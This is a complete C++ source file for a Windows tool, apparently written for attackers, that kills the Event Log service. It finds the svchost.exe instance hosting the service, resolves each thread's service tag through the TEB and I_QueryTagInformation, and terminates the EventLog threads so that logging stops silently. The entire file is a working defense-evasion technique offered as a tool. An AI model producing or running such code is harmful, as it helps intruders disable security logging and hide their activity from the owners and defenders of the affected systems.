// eventlogkill.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib") 

char *exename = "svchost.exe";
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS    exitStatus;
	PVOID       pTebBaseAddress;
	CLIENT_ID   clientId;
	KAFFINITY               AffinityMask;
	int						Priority;
	int						BasePriority;
	int						v;

} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef enum _SC_SERVICE_TAG_QUERY_TYPE
{
	ServiceNameFromTagInformation = 1,
	ServiceNameReferencingModuleInformation,
	ServiceNameTagMappingInformation,
} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;

typedef struct _SC_SERVICE_TAG_QUERY
{
	ULONG   processId;
	ULONG   serviceTag;
	ULONG   reserved;
	PVOID   pBuffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;

typedef NTSTATUS(WINAPI *NtQueryInformationProcessFake)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
#define errorlog(data) {printf("API Error:%s Code:%d\n",data,GetLastError());}

void EnumProcess();
void test(int);
void checkeventlog(CHAR *, int);
void EnumProcess() {
	HANDLE hprocesseap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hprocesseap) {
		errorlog("Funcion EnumProcess--->CreateToolhelp32Snapshot");
	}
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);
	BOOL getlist = Process32First(hprocesseap, &pe);
	while (getlist)
	{
		CHAR processname[100];
		sprintf(processname, "%ws", pe.szExeFile);
		if (strcmp(exename, processname) == 0) {
			test(pe.th32ProcessID);
		}
		getlist = Process32Next(hprocesseap, &pe);
	}

}


void test(int pid) {
	HANDLE target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	PEB peb = { 0 };
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	NtQueryInformationProcessFake NtQueryInformationProcess;
	RTL_USER_PROCESS_PARAMETERS Param = { 0 };
	int commandlength = 0;

	NtQueryInformationProcess = (NtQueryInformationProcessFake)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess(target, 0, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	ReadProcessMemory(target, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL);
	ReadProcessMemory(target, peb.ProcessParameters, &Param, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);
	WCHAR *buffer = new WCHAR[Param.CommandLine.Length + 1];
	ZeroMemory(buffer, (Param.CommandLine.Length + 1) * sizeof(WCHAR));
	ReadProcessMemory(target, Param.CommandLine.Buffer, buffer, Param.CommandLine.Length, NULL);
	if (wcsstr(buffer, L"LocalServiceNetworkRestricted")!=NULL) {
		printf("PID:%d\n", pid);
		checkeventlog(exename, pid);
	}
}

void checkeventlog(CHAR *name, int pid) {
	printf("%s %d\n", name, pid);
	pNtQueryInformationThread NtQueryInformationThread = NULL;
	pI_QueryTagInformation I_QueryTagInformation = NULL;
	THREADENTRY32 te;
	THREAD_BASIC_INFORMATION tbi = { 0 };
	SC_SERVICE_TAG_QUERY tagQuery = { 0 };
	te.dwSize = sizeof(THREADENTRY32);
	HANDLE hTag = NULL;
	NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationThread");
	I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(LoadLibrary(L"advapi32.dll"), "I_QueryTagInformation");
	HANDLE threads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (INVALID_HANDLE_VALUE == threads) {
		errorlog("checkeventlog--->CreateToolhelp32Snapshot");
	}
	BOOL getlist = Thread32First(threads, &te);
	while (getlist) {
		if (te.th32OwnerProcessID == pid) {
			HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			NtQueryInformationThread(hthread, (THREAD_INFORMATION_CLASS)0, &tbi, 0x30, NULL);
			HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, te.th32OwnerProcessID);
			ReadProcessMemory(hprocess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &hTag, sizeof(HANDLE), NULL);
			tagQuery.processId = te.th32OwnerProcessID;
			tagQuery.serviceTag = (ULONG)hTag;
			I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &tagQuery);
			CHAR servicename[MAX_PATH] = { 0 };
			sprintf(servicename, "%ws", tagQuery.pBuffer);
			if (strcmp(servicename, "EventLog")==0) {
				printf("Kill %d %s\n", te.th32ThreadID, servicename);
				TerminateThread(hthread, 0);
			}
			else if (strcmp(servicename, "eventlog")==0) {
				printf("Kill %d %s\n", te.th32ThreadID, servicename);
				TerminateThread(hthread, 0);
			}
			tagQuery = { 0 }; //重置线程数组，不然只有一个线程的信息一直刷一样的 -作为一个例子记得写入笔记 (
		}
		getlist = Thread32Next(threads, &te);
	}
}

int main()
{
	EnumProcess();
	system("pause");
	return 0;
}

